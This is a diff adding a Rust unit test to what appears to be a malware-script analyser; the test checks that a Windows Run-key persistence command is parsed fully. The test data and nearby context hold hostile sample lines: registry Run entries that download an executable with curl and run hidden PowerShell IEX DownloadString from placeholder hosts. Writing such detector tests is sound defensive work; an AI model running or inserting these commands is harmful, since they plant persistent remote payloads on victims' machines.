@@ -1779,6 +1779,26 @@ reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd 
     }
 
     #[test]
+    fn reg_add_run_key_unquoted_data_captures_full_child_command() {
+        let script = br#"@echo off
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d cmd.exe /c curl -o out.exe https://reg-unquoted.example/p.exe /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, value_name, command, .. }
+                    if hive == "HKCU"
+                        && value_name == "Updater"
+                        && command == "cmd.exe /c curl -o out.exe https://reg-unquoted.example/p.exe"
+            )),
+            "unquoted reg /d command was not captured fully: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn reg_add_run_key_preserves_backslash_escaped_nested_quotes() {
         let script = br##"@echo off
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "#One" /t REG_SZ /d "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://reg-quoted.example/p.ps1');\"" /f
